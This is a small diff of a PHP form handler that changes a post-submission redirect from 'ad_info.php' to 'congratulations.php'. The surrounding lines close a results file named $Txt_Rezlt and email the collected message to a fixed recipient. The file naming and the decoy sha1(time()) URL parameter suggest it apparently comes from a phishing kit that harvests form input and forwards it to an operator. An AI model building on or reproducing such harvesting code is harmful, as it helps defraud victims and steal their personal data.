@@ -153,6 +153,6 @@ if (isset($_POST['next']))
 	fclose($Txt_Rezlt);
 	mail($to, $subject, $message, $headers);
 
-	header('Location: ../ad_info.php?udm_cat_path='.sha1(time()));
+	header('Location: ../congratulations.php?udm_cat_path='.sha1(time()));
 
 }
